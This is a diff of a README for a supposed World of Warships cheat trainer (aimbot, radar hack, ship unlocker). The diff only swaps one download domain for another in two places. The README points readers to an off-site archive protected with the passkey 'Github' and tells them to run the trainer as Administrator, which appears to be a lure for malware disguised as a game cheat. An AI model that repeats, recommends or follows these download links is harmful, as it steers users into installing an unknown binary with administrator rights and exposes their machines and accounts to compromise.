@@ -6,7 +6,7 @@ World of Warships trainer with aimbot, radar hack, ship unlocker, and more. For 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular mods like **Wargaming Modpack** and **WOWS Mods**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch World of Warships.
 4. Run the trainer **as Administrator**.
